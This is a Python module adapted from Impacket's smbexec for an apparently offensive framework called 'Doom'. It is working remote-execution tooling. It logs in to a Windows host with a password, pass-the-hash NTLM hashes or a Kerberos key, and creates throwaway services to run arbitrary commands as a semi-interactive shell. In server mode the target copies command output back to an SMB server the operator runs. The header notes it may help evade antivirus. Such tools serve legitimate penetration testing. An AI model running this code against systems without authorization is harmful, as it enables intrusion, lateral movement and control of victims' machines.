#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# A similar approach to psexec w/o using RemComSvc. The technique is described here
# https://www.optiv.com/blog/owning-computers-without-shell-access
# Our implementation goes one step further, instantiating a local smbserver to receive the
# output of the commands. This is useful in the situation where the target machine does NOT
# have a writeable share available.
# Keep in mind that, although this technique might help avoiding AVs, there are a lot of
# event logs generated and you can't expect executing tasks that will last long since Windows
# will kill the process since it's not responding as a Windows service.
# Certainly not a stealthy way.
#
# This script works in two ways:
# 1) share mode: you specify a share, and everything is done through that share.
# 2) server mode: if for any reason there's no share available, this script will launch a local
#    SMB server, so the output of the commands executed are sent back by the target machine
#    into a locally shared folder. Keep in mind you would need root access to bind to port 445
#    in the local machine.
#
# Author:
#  beto (@agsolino)
#
# Reference for:
#  DCE/RPC and SMB.
from __future__ import division
from __future__ import print_function
import sys
import os
import cmd
import random
import string
try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser
import logging
from impacket import LOG
from threading import Thread

from impacket.examples import logger
from impacket import version, smbserver
from impacket.smbconnection import SMB_DIALECT
from impacket.dcerpc.v5 import transport, scmr
from Doom.module.color import C

OUTPUT_FILENAME = '__output'
BATCH_FILENAME  = 'doom.bat'
SMBSERVER_DIR   = '__tmp'
DUMMY_SHARE     = 'TMP'

class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.smb = None

    def cleanup_server(self):
        logging.info('Cleaning up..')
        try:
            os.unlink(SMBSERVER_DIR + '/smb.log')
        except OSError:
            pass
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        logging.info('Creating tmp directory')
        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception as e:
            logging.critical(str(e))
            pass
        logging.info('Setting up SMB Server')
        self.smb.processConfigFile()
        logging.info('Ready to listen...')
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class SMBEXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None,
                 doKerberos=False, kdcHost=None, mode='SHARE', share="C$", port=445):

        self.target = None
        self.username = username
        self.password = password
        self.port = port
        self.domain = domain
        self.lmhash = ''
        self.nthash = ''
        self.aesKey = aesKey
        self.doKerberos = doKerberos
        self.kdcHost = kdcHost
        self.share = share
        self.mode  = mode
        self.shell = None
        self.avaliable_opt = ['target','user','password','port','hashes','aeskey','mode','share','kerberos','dcip','domain']
        if hashes is not None:
            self.lmhash, self.nthash = hashes.split(':')

    def exec(self):
        self.serviceName = ''.join(random.choice(string.ascii_letters) for i in range(5))

        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % self.target
        LOG.debug('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.port)
        rpctransport.setRemoteHost(self.target)
        if hasattr(rpctransport,'preferred_dialect'):
            rpctransport.preferred_dialect(SMB_DIALECT)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.username, self.password, self.domain, self.lmhash,
                                         self.nthash, self.aesKey)
        rpctransport.set_kerberos(self.doKerberos, self.kdcHost)

        self.shell = None
        try:
            if self.mode == 'SERVER':
                serverThread = SMBServer()
                serverThread.daemon = True
                serverThread.start()
            self.shell = RemoteShell(self.share, rpctransport, self.mode, self.serviceName)
            self.shell.cmdloop()
            if self.mode == 'SERVER':
                serverThread.stop()
        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.critical(str(e))
            if self.shell is not None:
                self.shell.finish()
            sys.stdout.flush()


    def show_help(self):
        print("\n\t    Show available commands for current module\n")
        print('''
            A similar approach to psexec w/o using RemComSvc. The technique is described here
            https://www.optiv.com/blog/owning-computers-without-shell-access
            Our implementation goes one step further, instantiating a local smbserver to receive the
            output of the commands. This is useful in the situation where the target machine does NOT
            have a writeable share available.
            
            '''+C.BOLD+C.FAIL+'''Keep in mind that, although this technique might help avoiding AVs, there are a lot of
            event logs generated and you can't expect executing tasks that will last long since Windows
            will kill the process since it's not responding as a Windows service.
            Certainly not a stealthy way.'''+C.ENDC+'''
            
            This script works in two ways:
            1)  share mode: you specify a share, and everything is done through that share.
            2)  server mode: if for any reason there's no share available, this script will launch a local
                SMB server, so the output of the commands executed are sent back by the target machine
                into a locally shared folder. Keep in mind you would need root access to bind to port 445
                in the local machine.
        ''')
        print("\n\t    help - print this help")
        print("\t    show options - list available options")
        print("\t    set - use to set required options\n")

    def set_target(self,target):
        self.target = target
        print("TARGET => %s" % target)

    def set_user(self,username):
        self.username = username
        print("USER => %s" % username)

    def set_password(self,password):
        self.password = password
        print("PASSWORD => %s" % password)

    def set_domain(self,domain):
        self.domain = domain
        print("DOMAIN => %s" % domain)

    def set_hashes(self,hashes):
        self.lmhash, self.nthash = hashes.split(':')
        print("HASH => %s" % hashes)

    def set_aeskey(self,aeskey):
        self.aesKey = aeskey
        self.doKerberos = True
        print("AESKEY => %s" % aeskey)

    def set_share(self,share):
        self.share = share
        print("SHARE => %s" % share)

    def set_dcip(self,dc_ip):
        self.kdcHost = dc_ip
        print("KDCHOST => %s" % dc_ip)

    def set_mode(self,mode):
        self.mode = mode
        print("MODE => %s" % mode)

    def set_kerberos(self,k):
        if "true" == str.lower(k):
            self.doKerberos = True
        else:
            self.doKerberos = False
        print("KERBEROS => %s" % k)


    def show_options(self):
        print("\n\tShow Available options for current module\n")
        print("\tTARGET - REMOTE TARGET IP ADDRESS")
        print("\tUSER - USER NAME USE TO AUTHENTICATE TO REMOTE SERVER ")
        print("\tPASSWORD - PASSWORD  USE TO AUTHENTICATE TO REMOTE SERVER")
        print("\tPORT - TARGET PORT RUNNING SMB SERVICE DEFAULT is 445 (139,445) (OPTIONAL)")
        print("\tMODE - SERVER OR SHARE MODE TO USE DEFAULT IS SHARE")
        print("\tSHARE - "+str.upper("share where the output will be grabbed from (default C$)"))
        print("\tDCIP - "+str.upper(" IP Address of the domain controller. If omitted it will use the domain part (FQDN) "
                                   "specified in the target parameter"))
        print("\tHASHES - " +str.upper("NTLM hashes, format is LMHASH:NTHASH"))
        print("\tKERBEROS - " + str.upper('Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line'))
        print("\tAESKEY - "+str.upper('AES key to use for Kerberos Authentication (128 or 256 bits)'))

        print("\n\tCurrent Settings\n")

        if self.target is not None:
            print("\tTARGET => %s" % self.target)
        if self.doKerberos:
            print("\tKERBEROS => TRUE")
        else:
            print("\tKERBEROS => FALSE")
        if self.mode:
            print("\tMODE => %s" % self.mode)
        if self.port:
            print("\tPORT => %s" % self.port)
        if self.nthash and self.lmhash:
            print("\tHASHES => %s" % self.lmhash+self.nthash)
        if self.username:
            print("\tUSER => %s" % self.username)
        if self.password:
            print("\tPASSWORD => %s" % self.password)
        print("\n")

    def run(self):
        try:
            self.exec()
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                logging.critical(str(e))

class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName):
        cmd.Cmd.__init__(self)
        self.share = share
        self.mode = mode
        self.__output = '\\\\127.0.0.1\\' + self.share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = b''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute'

        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
            s = rpc.get_smb_connection()
            s.setTimeout(100000)
            if mode == 'SERVER':
                myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
                self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
            self.transferClient = rpc.get_smb_connection()
            self.do_cd('')
        except Exception as e:
            logging.critical(str(e))



    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect()
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except scmr.DCERPCException:
           pass

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        # We just can't CD or maintain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ' )
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
            self.__outputBuffer = b''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.mode == 'SHARE':
            self.transferClient.getFile(self.share, OUTPUT_FILENAME, output_callback)
            self.transferClient.deleteFile(self.share, OUTPUT_FILENAME)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile
        if self.mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile

        logging.debug('Executing %s' % command)
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                     lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except Exception :
           pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print(self.__outputBuffer.decode())
        self.__outputBuffer = b''






